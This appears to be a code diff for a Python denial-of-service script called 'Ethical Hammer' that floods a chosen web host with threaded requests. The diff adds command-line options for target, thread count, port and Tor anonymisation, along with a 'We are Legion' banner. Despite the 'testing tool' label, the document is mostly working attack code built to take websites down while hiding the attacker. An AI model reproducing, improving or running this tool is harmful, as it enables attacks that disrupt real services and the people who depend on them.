@@ -3,7 +3,6 @@ import requests
 import threading
 import time
 import random
-from ping3 import ping
 
 useragents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
@@ -18,11 +17,6 @@ def attack(target, port, threads, use_tor):
         try:
             response = requests.get(url, headers=headers, timeout=5)
             print(f"Connected to host... Status Code: {response.status_code}")
-
-            # Ping the target after a successful connection
-            ping_time = ping(target)
-            print(f"Ping to {target}: {ping_time} ms")
-
         except Exception as e:
             print(f"Error: {str(e)}")
 
@@ -35,6 +29,25 @@ def attack(target, port, threads, use_tor):
         sleep_time = 20 if not use_tor else 40
         time.sleep(sleep_time)
 
-# Call the attack function directly
-attack("your_target", 80, 256, False)  # Replace "your_target" with the actual target
+def main():
+    parser = argparse.ArgumentParser(description="Ethical Hammer - Slow POST DoS Testing Tool")
+    parser.add_argument("-t", "--target", required=True, help="Hostname or IP of the target")
+    parser.add_argument("-r", "--threads", type=int, default=256, help="Number of threads (default: 256)")
+    parser.add_argument("-p", "--port", type=int, default=80, help="Web server port (default: 80)")
+    parser.add_argument("-T", "--tor", action="store_true", help="Enable anonymizing through Tor on 127.0.0.1:9150")
+    args = parser.parse_args()
 
+    print("\n * Ethical Hammer")
+    print(" * Slow POST DoS Testing Tool")
+    print(" * entropy [at] phiral.net")
+    print(" * Anon-ymized via Tor")
+    print(" * We are Legion.\n")
+
+    print(f"Target: {args.target} Port: {args.port}")
+    print(f"Threads: {args.threads} Tor: {args.tor}")
+    print("Give 20 seconds without Tor or 40 with before checking the site")
+
+    attack(args.target, args.port, args.threads, args.tor)
+
+if __name__ == "__main__":
+    main()
